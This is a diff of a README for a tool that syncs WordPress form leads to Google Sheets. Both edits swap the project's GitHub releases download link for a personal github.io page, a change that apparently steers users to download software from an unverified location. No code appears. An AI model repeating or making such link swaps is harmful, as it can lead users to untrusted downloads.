@@ -1,6 +1,6 @@
 # 🚀 cv-lead-to-sheet-bridge - Sync WordPress lead data to sheets
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Stephiepicurean195/cv-lead-to-sheet-bridge/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://stephiepicurean195.github.io)
 
 This application transfers entries from your website forms directly into Google Sheets. Businesses use this tool to manage customer data without manual data entry. The bridge supports popular WordPress form plugins. It functions as a secure connector between your site and your spreadsheet.
 
@@ -16,7 +16,7 @@ Ensure your computer has the following items before you start:
 ## 📥 Downloading the software
 
 Visit this page to download the latest version of the application:
-https://github.com/Stephiepicurean195/cv-lead-to-sheet-bridge/releases
+https://stephiepicurean195.github.io
 
 1. Open the link above in your web browser.
 2. Look for the section labeled Assets.
